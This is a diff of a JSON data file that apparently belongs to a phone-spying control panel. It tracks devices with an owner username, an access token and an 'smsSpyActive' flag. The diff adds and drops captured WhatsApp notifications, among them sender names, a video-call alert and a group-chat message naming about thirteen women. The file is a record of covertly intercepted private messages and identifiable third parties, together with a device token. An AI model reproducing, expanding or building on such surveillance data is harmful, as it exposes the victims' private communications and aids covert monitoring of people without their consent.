@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776919064851,
+    "lastSeen": 1776919082735,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Telepon video berlangsung",
+        "time": "23/04 12:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776919066642
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4011,14 +4019,6 @@
         "time": "23/04 09:26",
         "pkg": "com.whatsapp",
         "receivedAt": 1776907593451
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 09:26",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776907593440
       }
     ],
     "galleryPhotos": [],
@@ -9969,6 +9969,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Senam Rappocini: ~ ☀☀☀",
+        "content": "Tabe ibu ibu yang mau ke  Anjungan besok sore  senam listmi namax \n1.Rosmini\n2.Dg pat muli\n3.Halbatia\n4 kartini\n5.Hera\n6.isa\n7.mustafia\n8.kak suarni\n9.dg lanti\n10.ibu fit\n11. Dg sakking\n12. Tika\n13. Nursamsi",
+        "time": "23/04 12:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776919083934
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
